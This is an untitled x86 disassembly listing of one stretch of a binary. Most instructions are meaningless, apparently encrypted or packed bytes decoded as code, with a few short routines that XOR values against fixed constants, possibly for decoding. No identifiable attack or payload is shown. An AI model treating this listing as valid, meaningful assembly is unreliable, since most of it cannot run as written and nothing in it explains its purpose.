  40df20:	mov    al,0xf7
  40df22:	pop    edx
  40df23:	sub    DWORD PTR [ebx],eax
  40df25:	xchg   ebx,eax
  40df26:	jl     0x40df9c
  40df28:	sub    al,0x88
  40df2a:	push   ebx
  40df2b:	and    DWORD PTR [esi],esi
  40df2d:	pop    ecx
  40df2e:	stos   BYTE PTR es:[edi],al
  40df2f:	sbb    eax,0xf0e3e7d7
  40df34:	cmp    ecx,0xbeb35089
  40df3a:	repz dec edi
  40df3c:	clc    
  40df3d:	sub    bl,dh
  40df3f:	sub    BYTE PTR [edx+0x6104c0c0],cl
  40df45:	int    0x47
  40df47:	mov    edx,0xc48f30ba
  40df4c:	ret    
  40df4d:	mov    DWORD PTR es:[eax],edx
  40df50:	xor    eax,0x545b3f84
  40df55:	cwde   
  40df56:	cmc    
  40df57:	dec    ecx
  40df58:	pop    edx
  40df59:	inc    ecx
  40df5a:	data16 mov cl,0xc3
  40df5d:	outs   dx,DWORD PTR ds:[esi]
  40df5e:	adc    al,0x12
  40df60:	mov    ecx,0x833842de
  40df65:	les    ebp,FWORD PTR [eax-0x35d763d7]
  40df6b:	fcom   st(4)
  40df6d:	adc    cl,BYTE PTR [esi+edi*2]
  40df70:	xchg   edi,eax
  40df71:	sbb    DWORD PTR [eax+eiz*1+0x6ce4946f],edi
  40df78:	gs push esp
  40df7a:	in     eax,dx
  40df7b:	shl    DWORD PTR [eax+0x5f],1
  40df7e:	sbb    al,0xa6
  40df80:	push   eax
  40df81:	sahf   
  40df82:	in     eax,dx
  40df83:	or     cl,BYTE PTR [ebx]
  40df85:	sti    
  40df86:	jnp    0x40df67
  40df88:	std    
  40df89:	das    
  40df8a:	dec    edi
  40df8b:	(bad)
  40df90:	jns    0x40df81
  40df92:	mov    ebx,0x98afddc8
  40df97:	adc    al,0x85
  40df99:	std    
  40df9a:	fidivr DWORD PTR [ebx]
  40df9c:	das    
  40df9d:	sub    ah,0xa7
  40dfa0:	xchg   DWORD PTR [edx-0x1f11f72c],ebp
  40dfa6:	pop    ecx
  40dfa7:	mov    edx,DWORD PTR [ebp-0x4c]
  40dfaa:	xor    edx,edx
  40dfac:	shl    eax,0x1e
  40dfaf:	mov    ax,dx
  40dfb2:	or     ax,cx
  40dfb5:	mov    ecx,DWORD PTR [ebp-0x4]
  40dfb8:	cmp    WORD PTR [ecx],ax
  40dfbb:	je     0x40eb64
  40dfc1:	mov    eax,DWORD PTR [ebp+0x14]
  40dfc4:	sub    DWORD PTR [ebp-0x4],eax
  40dfc7:	mov    eax,DWORD PTR [esi]
  40dfc9:	mov    ecx,DWORD PTR [esi+0x4]
  40dfcc:	mov    ecx,eax
  40dfce:	jmp    0x40e558
  40dfd3:	push   ebx
  40dfd4:	cli    
  40dfd5:	test   dh,ah
  40dfd7:	fs pop eax
  40dfd9:	pop    ecx
  40dfda:	jb     0x40df93
  40dfdc:	shr    DWORD PTR [esi+ebp*4-0x57bd2a31],1
  40dfe3:	sub    ch,BYTE PTR [eax+0x43d1616]
  40dfe9:	push   ss
  40dfea:	push   ss
  40dfeb:	clc    
  40dfec:	cmp    dl,BYTE PTR [ebx]
  40dfee:	pop    ds
  40dfef:	push   cs
  40dff0:	or     BYTE PTR [edi-0x5d],bh
  40dff3:	ds pop eax
  40dff5:	or     esi,DWORD PTR [edi+edx*8-0x1c4938e5]
  40dffc:	pop    eax
  40dffd:	mov    dh,0xbf
  40dfff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e000:	arpl   WORD PTR [ecx],bp
  40e002:	mov    al,ds:0xf3659ed4
  40e007:	in     al,0x4d
  40e009:	imul   DWORD PTR [ecx]
  40e00b:	add    al,0x72
  40e00d:	les    edx,FWORD PTR [esi+eiz*8]
  40e010:	jno    0x40e061
  40e012:	xor    DWORD PTR [edx+0x377dcdc5],edx
  40e018:	int3   
  40e019:	pop    ebx
  40e01a:	dec    edx
  40e01b:	fsubr  QWORD PTR [ebx+0x351a49e6]
  40e021:	icebp  
  40e022:	loope  0x40e082
  40e024:	add    edx,DWORD PTR [edx+ecx*2]
  40e027:	sbb    BYTE PTR ds:0x8f73333,0x46
  40e02e:	jnp    0x40dfca
  40e030:	mov    ds:0x37740681,eax
  40e035:	adc    DWORD PTR [edx+0x65fd4b0c],eax
  40e03b:	mov    bh,0xf2
  40e03d:	(bad)  
  40e03e:	push   ss
  40e03f:	call   0xdc7d4b0d
  40e044:	hlt    
  40e045:	mov    al,0xbe
  40e047:	addr16 call 0xb99e:0x44271889
  40e04f:	aam    0xb0
  40e051:	push   0x20
  40e053:	not    BYTE PTR [ebx-0x50845aa7]
  40e059:	jge    0x40e0a2
  40e05b:	sbb    BYTE PTR [ebp+0x61344abd],bl
  40e061:	mov    dl,0x69
  40e063:	popf   
  40e064:	daa    
  40e065:	or     al,0x36
  40e067:	mov    ecx,ebp
  40e069:	cld    
  40e06a:	inc    ebx
  40e06b:	imul   esi,edx,0xd9afb3de
  40e071:	or     BYTE PTR [ebp+0x4c0e5d24],bl
  40e077:	cld    
  40e078:	mov    bh,0x47
  40e07a:	imul   ecx,ebp,0x27605ab4
  40e080:	lahf   
  40e081:	sub    dh,ah
  40e083:	pushf  
  40e084:	pop    es
  40e085:	push   ds
  40e086:	pop    edi
  40e087:	and    esp,DWORD PTR [ebx+0x3174fbf4]
  40e08d:	dec    edx
  40e08e:	cmp    DWORD PTR [edi],ebx
  40e090:	scas   eax,DWORD PTR es:[edi]
  40e091:	idiv   BYTE PTR [edx-0x63]
  40e094:	call   0xbfff:0xa3f66a37
  40e09b:	lahf   
  40e09c:	add    edx,DWORD PTR [edi+ebp*8]
  40e09f:	mov    BYTE PTR [edi-0x5d],dl
  40e0a2:	je     0x40e0f9
  40e0a4:	lods   eax,DWORD PTR ds:[esi]
  40e0a5:	aaa    
  40e0a6:	adc    DWORD PTR [eax+0x1736edfb],eax
  40e0ac:	rcl    DWORD PTR ds:0x360a10cf,1
  40e0b2:	adc    BYTE PTR [ebx],bh
  40e0b4:	sbb    al,0xda
  40e0b6:	ss dec esp
  40e0b8:	hlt    
  40e0b9:	mov    ah,0xa7
  40e0bb:	mov    cl,BYTE PTR [esi]
  40e0bd:	ret    0xa85c
  40e0c0:	and    BYTE PTR ds:0x2bea585d,bl
  40e0c6:	push   0x9
  40e0c8:	mov    bh,0xcd
  40e0ca:	fwait
  40e0cb:	out    0x71,al
  40e0cd:	push   es
  40e0ce:	aaa    
  40e0cf:	ins    DWORD PTR es:[edi],dx
  40e0d0:	mov    esp,0x1f85cb8a
  40e0d5:	add    BYTE PTR ds:0x98f831b6,ch
  40e0db:	dec    ebx
  40e0dc:	sbb    BYTE PTR [ebx+0x584b2282],bl
  40e0e2:	mov    cl,0x4
  40e0e4:	adc    eax,0x5f1c5280
  40e0e9:	aam    0x6c
  40e0eb:	xchg   ebp,eax
  40e0ec:	sub    al,0x77
  40e0ee:	pop    ebx
  40e0ef:	test   BYTE PTR [edi+ebp*8-0x20c8917f],al
  40e0f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0f7:	lea    esp,[ebx+0x78]
  40e0fa:	fs mov ah,0x0
  40e0fd:	data16 (bad) 
  40e0ff:	pop    edx
  40e100:	mov    esp,0x74829d23
  40e105:	sub    esi,DWORD PTR [edx+ebx*4-0x43]
  40e109:	jge    0x40e13b
  40e10b:	and    eax,edi
  40e10d:	sub    DWORD PTR [ebp-0x4b],esi
  40e110:	pushf  
  40e111:	push   es
  40e112:	mov    ebx,0xc672d971
  40e117:	mov    dl,0x11
  40e119:	mov    dl,0x6e
  40e11b:	mov    BYTE PTR [ebx+eiz*2],0x4f
  40e11f:	jnp    0x40e0b8
  40e121:	cmp    BYTE PTR [ebx],dh
  40e123:	or     BYTE PTR [ebx+0x70],cl
  40e126:	test   al,0x8f
  40e128:	mov    WORD PTR [eax-0x5a],ds
  40e12b:	aam    0xcb
  40e12d:	pop    ss
  40e12e:	sbb    DWORD PTR [edi-0x43],0x6e775e09
  40e135:	cmc    
  40e136:	in     eax,0xd8
  40e138:	sub    eax,0x7601bc9d
  40e13d:	lock test eax,0xe7dfd447
  40e143:	sub    BYTE PTR [esi+eiz*4],ch
  40e146:	mov    dl,0x94
  40e148:	jb     0x40e102
  40e14a:	scas   eax,DWORD PTR es:[edi]
  40e14b:	sbb    cl,BYTE PTR [ebx-0x69a16d10]
  40e151:	cdq    
  40e152:	jo     0x40e13d
  40e154:	add    edi,DWORD PTR [ebx-0x7948719]
  40e15a:	(bad)  
  40e15c:	out    0xab,al
  40e15e:	jecxz  0x40e175
  40e160:	inc    ebx
  40e161:	ins    DWORD PTR es:[edi],dx
  40e162:	mov    ch,ah
  40e164:	sub    al,0x5f
  40e166:	push   0xdab7caa3
  40e16b:	sub    eax,0x4f514ed7
  40e170:	pusha  
  40e171:	ins    BYTE PTR es:[edi],dx
  40e172:	ins    BYTE PTR es:[edi],dx
  40e173:	or     dh,dh
  40e175:	sbb    DWORD PTR [eax+0x55],0x47f3915b
  40e17c:	xchg   edx,eax
  40e17d:	mov    cl,0x3
  40e17f:	cld    
  40e180:	sub    al,0x1e
  40e182:	push   eax
  40e183:	dec    ebx
  40e184:	push   edx
  40e185:	arpl   ax,dx
  40e187:	jmp    0x7964b5a3
  40e18c:	(bad)  
  40e18d:	(bad)  
  40e18e:	ss jnp 0x40e143
  40e191:	loope  0x40e1ee
  40e193:	jge    0x40e1d4
  40e195:	bound  edi,QWORD PTR [edi+ebp*4-0x67]
  40e199:	xchg   DWORD PTR [ebp+0x76],esi
  40e19c:	xchg   edi,eax
  40e19d:	out    dx,al
  40e19e:	lods   eax,DWORD PTR ds:[esi]
  40e19f:	xor    esi,DWORD PTR [edi+0x60f70305]
  40e1a5:	or     eax,0xa582f33b
  40e1aa:	or     eax,0xfe6dd778
  40e1af:	sub    DWORD PTR [edx-0x6ed515d0],0x6bebd6cd
  40e1b9:	mov    edx,0xe74ecf97
  40e1be:	bnd data16 jo 0x40e23b
  40e1c2:	(bad)  
  40e1c3:	(bad)  [esi+edx*2]
  40e1c6:	mov    edx,0x57c50eae
  40e1cb:	or     eax,0xc99df16d
  40e1d0:	xchg   DWORD PTR [ebp-0x5c],ebp
  40e1d3:	jl     0x40e1b4
  40e1d5:	fnstcw WORD PTR [edx+eiz*1-0x2]
  40e1d9:	adc    ecx,ecx
  40e1db:	and    BYTE PTR [ecx+0x3d],al
  40e1de:	lock mov bh,0x7c
  40e1e1:	jno    0x40e22c
  40e1e3:	es xchg eax,esp
  40e1e6:	and    edx,ebp
  40e1e8:	inc    edx
  40e1e9:	arpl   WORD PTR [eax+0x6c],bx
  40e1ec:	(bad)  
  40e1ed:	sbb    eax,0x87243d13
  40e1f2:	outs   dx,DWORD PTR ds:[esi]
  40e1f3:	add    eax,0x14b23853
  40e1f8:	in     al,0xff
  40e1fa:	repnz cmp eax,0xd7fc6a49
  40e200:	std    
  40e201:	mov    edx,0x6b869419
  40e206:	pop    esp
  40e207:	and    al,0xde
  40e209:	jg     0x40e20c
  40e20b:	call   0xeee5:0x6f337dfa
  40e212:	push   cs
  40e213:	shl    DWORD PTR [eax-0x10],cl
  40e216:	dec    ebp
  40e217:	dec    ebx
  40e218:	daa    
  40e219:	sub    al,0xb9
  40e21b:	add    al,0xd7
  40e21d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e21e:	push   ecx
  40e21f:	push   0xf1c1451d
  40e224:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e225:	and    eax,0x3068e7f2
  40e22a:	test   DWORD PTR [edi],ebp
  40e22c:	int3   
  40e22d:	mov    ah,0x9c
  40e22f:	arpl   WORD PTR [ecx-0x77],sp
  40e232:	pop    esi
  40e233:	cmp    eax,0xc40a37de
  40e238:	icebp  
  40e239:	and    bl,cl
  40e23b:	pop    ds
  40e23c:	or     DWORD PTR [edi*8+0x2810d0a0],0xfc709824
  40e247:	nop
  40e248:	inc    eax
  40e249:	imul   ecx,DWORD PTR [ebp+0x6a],0x74fea762
  40e250:	adc    al,0x94
  40e252:	inc    ebx
  40e253:	mov    al,ds:0xfc2131e7
  40e258:	push   0xffffffd1
  40e25a:	rcr    DWORD PTR [ecx-0x5fe1c35e],cl
  40e260:	dec    esi
  40e261:	call   0x1781:0xff99eac1
  40e268:	arpl   WORD PTR [esi-0x41],sp
  40e26b:	pop    esi
  40e26c:	jmp    0x1c7d:0xd4185200
  40e273:	int3   
  40e274:	mov    esi,0xc4bf03a1
  40e279:	xor    eax,0x642f8b80
  40e27e:	jno    0x40e241
  40e280:	adc    eax,0xcf14e9d9
  40e285:	push   esp
  40e286:	icebp  
  40e287:	push   0xdd071bd8
  40e28c:	sti    
  40e28d:	repz jno 0x40e2a7
  40e290:	sub    BYTE PTR [ecx-0x39],dh
  40e293:	std    
  40e294:	jl     0x40e2f8
  40e296:	ds out 0x8e,al
  40e299:	xchg   edx,eax
  40e29a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e29b:	jmp    FWORD PTR [edx+ebx*8]
  40e29e:	and    DWORD PTR [edx-0x4fb4e05e],ebx
  40e2a4:	mov    ds,WORD PTR [edi]
  40e2a6:	ja     0x40e30e
  40e2a8:	test   ah,0xd3
  40e2ab:	dec    edi
  40e2ac:	add    al,al
  40e2ae:	fist   DWORD PTR [edx]
  40e2b0:	out    0xc8,al
  40e2b2:	mov    ch,0xca
  40e2b4:	in     al,dx
  40e2b5:	and    esp,esi
  40e2b7:	pop    edx
  40e2b8:	and    eax,0xa8f6815e
  40e2bd:	pop    es
  40e2be:	loop   0x40e337
  40e2c0:	push   esp
  40e2c1:	mov    ebp,0x3f7d7348
  40e2c6:	loop   0x40e295
  40e2c8:	scas   al,BYTE PTR es:[edi]
  40e2c9:	pop    edx
  40e2ca:	aas    
  40e2cb:	ror    DWORD PTR ds:0x6b710745,cl
  40e2d1:	hlt    
  40e2d2:	adc    eax,0x5fb1ef70
  40e2d7:	push   ds
  40e2d8:	clc    
  40e2d9:	dec    ecx
  40e2da:	push   edx
  40e2db:	mov    dl,0xc3
  40e2dd:	es mov edx,0x83af5772
  40e2e3:	retf   
  40e2e4:	ret    
  40e2e5:	sti    
  40e2e6:	mov    dl,0x86
  40e2e8:	inc    eax
  40e2e9:	mov    ebp,0xc1e93a60
  40e2ee:	sub    al,0xd9
  40e2f0:	jns    0x40e30c
  40e2f2:	mov    bl,0xc0
  40e2f4:	imul   eax,DWORD PTR [ecx+ecx*8-0x31],0x725b376e
  40e2fc:	xchg   edi,eax
  40e2fd:	in     al,0x6
  40e2ff:	sub    al,0xe5
  40e301:	ins    BYTE PTR es:[edi],dx
  40e302:	mov    al,0xa
  40e304:	je     0x40e2fd
  40e306:	mov    ebx,0x9973bc13
  40e30b:	jmp    0x8b22:0x9e4e7329
  40e312:	sub    eax,0xdd0f234e
  40e317:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e318:	inc    eax
  40e319:	test   DWORD PTR [edx+0xa9e4854],esp
  40e31f:	xchg   ebx,eax
  40e320:	pop    esp
  40e321:	outs   dx,DWORD PTR ds:[esi]
  40e322:	mov    ebx,0xe16ad63d
  40e327:	lock test BYTE PTR [ebx+0x12],ah
  40e32b:	push   ebx
  40e32c:	mov    al,ds:0x4daf276f
  40e331:	cmp    dl,ah
  40e333:	jae    0x40e36d
  40e335:	stos   BYTE PTR es:[edi],al
  40e336:	or     bl,BYTE PTR [esi]
  40e338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e339:	dec    ebp
  40e33a:	dec    ebx
  40e33b:	rep lods eax,DWORD PTR ds:[esi]
  40e33d:	pop    ss
  40e33e:	pop    ebx
  40e33f:	adc    edi,DWORD PTR ds:0x1d982e89
  40e345:	jbe    0x40e2e7
  40e347:	push   edx
  40e348:	les    edi,FWORD PTR [esi+0x4d4bcbdd]
  40e34e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e34f:	int3   
  40e350:	mov    ebx,0xbc8bb16
  40e355:	xchg   ecx,eax
  40e356:	sahf   
  40e357:	push   ss
  40e358:	and    BYTE PTR [edi+eiz*2+0x3d],dl
  40e35c:	mov    ebp,0x6ae484d9
  40e361:	mov    ah,0xf9
  40e363:	dec    edi
  40e364:	rcr    BYTE PTR [ecx-0x6],0x9c
  40e368:	test   esp,0x63001b50
  40e36e:	dec    edx
  40e36f:	sub    ebx,DWORD PTR [ecx+0x6f0295b6]
  40e375:	cs arpl bx,di
  40e378:	dec    esi
  40e379:	cdq    
  40e37a:	mov    ecx,0xbd1e8330
  40e37f:	sbb    DWORD PTR [edx*1-0x1e8ddaf6],edx
  40e386:	cmc    
  40e387:	popf   
  40e388:	cmp    al,0xe0
  40e38a:	inc    ebx
  40e38b:	in     al,dx
  40e38c:	or     bl,cl
  40e38e:	ror    BYTE PTR [eax-0x2814991c],1
  40e394:	inc    eax
  40e395:	add    edi,DWORD PTR [eax-0x4b4e4aab]
  40e39b:	js     0x40e33c
  40e39d:	cmp    BYTE PTR [eax],0x31
  40e3a0:	ss cld 
  40e3a2:	imul   ebp,DWORD PTR [eax-0x227e7d07],0xdb436de
  40e3ac:	popf   
  40e3ad:	or     al,0x29
  40e3af:	xchg   ebx,eax
  40e3b0:	mov    es,WORD PTR [edx+0x73]
  40e3b3:	mov    al,0x4c
  40e3b5:	jp     0x40e42f
  40e3b7:	mov    ecx,DWORD PTR [ecx-0x56d9a420]
  40e3bd:	imul   ebx,DWORD PTR [esi],0xffffffd1
  40e3c0:	xchg   edi,eax
  40e3c1:	and    ch,BYTE PTR [ebx]
  40e3c3:	daa    
  40e3c4:	stos   DWORD PTR es:[edi],eax
  40e3c5:	mov    dl,0xd6
  40e3c7:	inc    ecx
  40e3c8:	mov    dh,0x85
  40e3ca:	enter  0xbf11,0x56
  40e3ce:	into   
  40e3cf:	imul   ch
  40e3d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3d2:	popa   
  40e3d3:	adc    dh,0x6c
  40e3d6:	inc    ecx
  40e3d7:	out    0x6b,eax
  40e3d9:	sub    esp,DWORD PTR [ebp+0x21]
  40e3dc:	xor    ecx,DWORD PTR [eax]
  40e3de:	jnp    0x40e37b
  40e3e0:	dec    ebp
  40e3e1:	xchg   esi,eax
  40e3e2:	sub    eax,DWORD PTR [eax-0x3a]
  40e3e5:	sub    BYTE PTR [ecx],0x21
  40e3e8:	retf   
  40e3e9:	enter  0x34b5,0x1e
  40e3ed:	xor    BYTE PTR [eax],dh
  40e3ef:	out    dx,al
  40e3f0:	and    eax,0xf9ec9347
  40e3f5:	int3   
  40e3f6:	mov    eax,0xea1137c
  40e3fb:	jge    0x40e460
  40e3fd:	(bad)  
  40e3ff:	(bad)  
  40e400:	push   edx
  40e401:	pop    ss
  40e402:	push   ebp
  40e403:	pop    ss
  40e404:	and    DWORD PTR [edx],0xdc2b35a0
  40e40a:	(bad)  
  40e40b:	repz or BYTE PTR [ebx+0x7487ba6c],bh
  40e412:	lahf   
  40e413:	adc    esi,ebp
  40e415:	cld    
  40e416:	sbb    DWORD PTR [esi],ebp
  40e418:	push   ds
  40e419:	mov    ebx,0x5a451f6a
  40e41e:	mov    cl,0x1f
  40e420:	cmp    eax,0xd2a57d22
  40e425:	das    
  40e426:	push   esp
  40e427:	jmp    0x40e3f2
  40e429:	cdq    
  40e42a:	aaa    
  40e42b:	cli    
  40e42c:	pusha  
  40e42d:	(bad)  
  40e42e:	out    dx,al
  40e42f:	in     al,0x3c
  40e431:	mov    ds,edi
  40e433:	inc    eax
  40e434:	into   
  40e435:	fcmovnu st,st(3)
  40e437:	xor    cl,BYTE PTR ds:0x5b423f8a
  40e43d:	mov    bh,0x69
  40e43f:	aas    
  40e440:	fnsave [esi]
  40e442:	mov    esp,0xcb93e788
  40e447:	test   al,0x70
  40e449:	dec    esi
  40e44a:	push   es
  40e44b:	outs   dx,BYTE PTR ds:[esi]
  40e44c:	jp     0x40e474
  40e44e:	ja     0x40e4b5
  40e450:	push   ss
  40e451:	inc    ebx
  40e452:	fdivr  DWORD PTR [ecx+0x37c7b240]
  40e458:	dec    edx
  40e459:	sahf   
  40e45a:	clc    
  40e45b:	lods   al,BYTE PTR ds:[esi]
  40e45c:	mov    esp,0xdce13c95
  40e461:	mov    ecx,0x7ebd6839
  40e466:	jbe    0x40e4cb
  40e468:	int3   
  40e469:	dec    ebx
  40e46a:	dec    ebp
  40e46b:	push   edx
  40e46c:	sbb    esi,0xffffffa6
  40e46f:	and    ecx,DWORD PTR ds:0x5b17d5ca
  40e475:	lds    edx,FWORD PTR [eax+0x8]
  40e478:	scas   eax,DWORD PTR es:[edi]
  40e479:	out    dx,eax
  40e47a:	push   esi
  40e47b:	hlt    
  40e47c:	jmp    0x40e442
  40e47e:	cwde   
  40e47f:	add    DWORD PTR [edi],edi
  40e481:	mov    ah,ch
  40e483:	(bad)  
  40e485:	cmp    bl,0x54
  40e488:	push   ss
  40e489:	clc    
  40e48a:	pop    ss
  40e48b:	inc    esp
  40e48c:	js     0x40e480
  40e48e:	loop   0x40e4c3
  40e490:	pop    es
  40e491:	pusha  
  40e492:	or     edx,DWORD PTR [ecx-0x6256d938]
  40e498:	inc    ecx
  40e499:	sbb    BYTE PTR [esi+0x16],dh
  40e49c:	mov    bl,0x1f
  40e49e:	loope  0x40e4dc
  40e4a0:	out    0x8b,al
  40e4a2:	pop    fs
  40e4a4:	cmp    al,0x78
  40e4a6:	adc    BYTE PTR [esi+0x2e566b02],cl
  40e4ac:	sub    BYTE PTR [esi],bl
  40e4ae:	repnz push esp
  40e4b0:	repz ds mov edx,0x56cfa0dc
  40e4b7:	into   
  40e4b8:	stos   DWORD PTR es:[edi],eax
  40e4b9:	push   es
  40e4ba:	push   esp
  40e4bb:	cmp    esi,DWORD PTR [ebx+ebp*1-0x441fda0e]
  40e4c2:	loope  0x40e4da
  40e4c4:	ds ins BYTE PTR es:[edi],dx
  40e4c6:	adc    ah,cl
  40e4c8:	mov    eax,0x8cf73692
  40e4cd:	pusha  
  40e4ce:	jle    0x40e4b2
  40e4d0:	hlt    
  40e4d1:	mov    ds:0x62fc64f0,al
  40e4d6:	xor    bh,dl
  40e4d8:	adc    DWORD PTR [edx],esi
  40e4da:	ja     0x40e550
  40e4dc:	cdq    
  40e4dd:	inc    ecx
  40e4de:	cdq    
  40e4df:	gs push ebx
  40e4e1:	mov    ch,0x36
  40e4e3:	mov    es,edi
  40e4e5:	push   0x3c
  40e4e7:	mov    edi,DWORD PTR [eax+0x62c1d5e5]
  40e4ed:	mov    ah,BYTE PTR [edx]
  40e4ef:	aaa    
  40e4f0:	cmp    bl,BYTE PTR [ebx+eax*2]
  40e4f3:	or     eax,0x133dc7e7
  40e4f8:	fidivr WORD PTR [esi+0x3a01313c]
  40e4fe:	inc    edx
  40e4ff:	mov    dl,0x35
  40e501:	out    0x49,al
  40e503:	mov    bh,0x38
  40e505:	add    cl,BYTE PTR [ebp-0x5a]
  40e508:	aam    0x99
  40e50a:	pop    ecx
  40e50b:	push   ds
  40e50c:	xor    dh,0xbb
  40e50f:	(bad)  
  40e510:	lahf   
  40e511:	xchg   esi,eax
  40e512:	mov    edi,0x7e742157
  40e517:	jg     0x40e4d0
  40e519:	pop    esp
  40e51a:	jo     0xaf81028c
  40e520:	fnstsw WORD PTR [ecx+eiz*8]
  40e523:	ret    0x5789
  40e526:	cmp    edx,DWORD PTR [ebp-0x54fbc9bd]
  40e52c:	dec    ebp
  40e52d:	mov    eax,0x67da4421
  40e532:	sub    al,0x53
  40e534:	test   bl,0x92
  40e537:	pop    eax
  40e538:	ins    DWORD PTR es:[edi],dx
  40e539:	cmp    BYTE PTR [edx],al
  40e53b:	xor    BYTE PTR [eax],cl
  40e53d:	xor    al,0xc5
  40e53f:	jne    0x40e4e8
  40e541:	mov    esi,0xd5da8d9c
  40e546:	fdecstp 
  40e548:	pop    edx
  40e549:	mov    cs,edx
  40e54b:	inc    edi
  40e54c:	fcom   DWORD PTR [edx+ecx*1+0x4357dbce]
  40e553:	pop    ss
  40e554:	btr    DWORD PTR [ebx-0x4e],esp
  40e558:	shl    ecx,0x1e
  40e55b:	xor    ecx,0xc0000000
  40e561:	mov    DWORD PTR [ebp-0x64],ecx
  40e564:	mov    ecx,DWORD PTR [esi]
  40e566:	mov    edx,DWORD PTR [esi+0x4]
  40e569:	xor    edx,0x9c0a89d8
  40e56f:	xor    ecx,0xba699573
  40e575:	shrd   ecx,edx,0x2
  40e579:	shr    edx,0x2
  40e57c:	or     edx,DWORD PTR [ebp-0x64]
  40e57f:	xor    eax,eax
  40e581:	or     ecx,eax
  40e583:	jmp    0x40eb0d
  40e588:	sahf   
  40e589:	or     ah,al
  40e58b:	jp     0x40e525
  40e58d:	cmp    bl,BYTE PTR [eax]
  40e58f:	sub    DWORD PTR [ebx+0x4a],ebp
  40e592:	mov    WORD PTR [esi-0x32],gs
  40e595:	xor    al,0xed
  40e597:	mov    ah,0x61
  40e599:	xchg   esp,eax
  40e59a:	push   ss
  40e59b:	push   ss
  40e59c:	cmp    eax,0xf8161604
  40e5a1:	(bad)  
  40e5a2:	int3   
  40e5a3:	in     eax,0x78
  40e5a5:	xor    ebp,esp
  40e5a7:	cdq    
  40e5a8:	pop    esi
  40e5a9:	xchg   ebp,eax
  40e5aa:	jo     0x40e539
  40e5ac:	clc    
  40e5ad:	inc    ecx
  40e5ae:	call   0x1517fc9b
  40e5b3:	push   edi
  40e5b4:	fst    QWORD PTR [esi-0x31dd1039]
  40e5ba:	inc    ebx
  40e5bb:	pop    ebx
  40e5bc:	pusha  
  40e5bd:	pop    ecx
  40e5be:	adc    DWORD PTR [edi+0x4c0baf5d],esi
  40e5c4:	imul   edx,DWORD PTR ds:0x2542f466,0x60e53b5f
  40e5ce:	pop    edi
  40e5cf:	div    cl
  40e5d1:	pop    esp
  40e5d2:	shl    BYTE PTR es:[esi-0x3eea6435],0x67
  40e5da:	lods   al,BYTE PTR ds:[esi]
  40e5db:	call   0x4d4d:0xdec70cf0
  40e5e2:	inc    esi
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	rcr    dh,cl
  40e5e6:	shl    DWORD PTR [eax+0x5c],1
  40e5e9:	xor    al,0x51
  40e5eb:	xor    dl,BYTE PTR [esi]
  40e5ed:	mov    dl,0x2a
  40e5ef:	push   cs
  40e5f0:	shl    BYTE PTR [eax-0x47fd16b7],0x7e
  40e5f7:	fwait
  40e5f8:	int3   
  40e5f9:	shr    DWORD PTR [eax],0x2b
  40e5fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e5fd:	mov    ch,0x75
  40e5ff:	mov    bh,0xd2
  40e601:	out    0x6f,eax
  40e603:	sar    DWORD PTR [ecx-0x5e],cl
  40e606:	add    al,0x39
  40e608:	(bad)  
  40e609:	sub    DWORD PTR [edi],0xffffff91
  40e60c:	sbb    eax,0x7646d37
  40e611:	mov    eax,ds:0xc01f7fb1
  40e616:	add    ebp,DWORD PTR [eax+ebp*2+0x72fdff19]
  40e61d:	icebp  
  40e61e:	fscale 
  40e620:	mov    dl,0xa4
  40e622:	xchg   ecx,eax
  40e623:	jns    0x40e68e
  40e625:	jbe    0x40e5ed
  40e627:	push   ebp
  40e628:	in     eax,0x91
  40e62a:	and    ah,BYTE PTR [esi-0x3f]
  40e62d:	jbe    0x40e5eb
  40e62f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e630:	rcr    DWORD PTR [edx],cl
  40e632:	jnp    0x40e5e9
  40e634:	aam    0x12
  40e636:	ins    DWORD PTR es:[edi],dx
  40e637:	pop    edi
  40e638:	test   al,0xef
  40e63a:	(bad)  
  40e63b:	je     0x40e623
  40e63d:	sub    ebx,DWORD PTR [esi+0x38]
  40e640:	dec    ecx
  40e641:	dec    edi
  40e642:	push   0x16
  40e644:	cwde   
  40e645:	sub    eax,0xf4e02f24
  40e64a:	popf   
  40e64b:	jecxz  0x40e69f
  40e64d:	push   es
  40e64e:	aas    
  40e64f:	mov    ebp,0x3631d5b3
  40e654:	popa   
  40e655:	iret   
  40e656:	fldcw  WORD PTR [eax-0x5b]
  40e659:	stc    
  40e65a:	imul   ebx,DWORD PTR [edx+0x7da7845b],0x55
  40e661:	mov    ebp,0x95dbe523
  40e666:	pop    edx
  40e667:	repz and DWORD PTR [ebx+0x36],0xd80cac
  40e66f:	popf   
  40e670:	xor    esi,DWORD PTR [edx+ebp*8]
  40e673:	and    eax,0x8a9c8661
  40e678:	sbb    dl,BYTE PTR ds:0xbfc34bc9
  40e67e:	retf   0x5d1b
  40e681:	xor    cl,cl
  40e683:	iret   
  40e684:	inc    eax
  40e685:	mov    bh,0x2a
  40e687:	jg     0x40e6ee
  40e689:	popf   
  40e68a:	cmp    DWORD PTR [ebx-0x14],esp
  40e68d:	mov    edi,0x54c9d1ce
  40e692:	shl    al,0xe9
  40e695:	sahf   
  40e696:	dec    eax
  40e697:	push   ebp
  40e698:	add    eax,0x1ce33b52
  40e69d:	push   esi
  40e69e:	jb     0x40e631
  40e6a0:	mov    gs,ecx
  40e6a2:	pop    ebx
  40e6a3:	addr16 mul ch
  40e6a6:	sub    BYTE PTR [esi-0x4d],al
  40e6a9:	loop   0x40e62f
  40e6ab:	inc    edi
  40e6ac:	jno    0x40e677
  40e6ae:	sar    bl,cl
  40e6b0:	loopne 0x40e6f3
  40e6b2:	mov    dh,0x7f
  40e6b4:	test   dh,bl
  40e6b6:	adc    eax,0xe7861cc3
  40e6bb:	pop    edx
  40e6bc:	pop    esi
  40e6bd:	lods   al,BYTE PTR ds:[esi]
  40e6be:	xchg   edx,eax
  40e6bf:	sbb    eax,0x1fe7a0e3
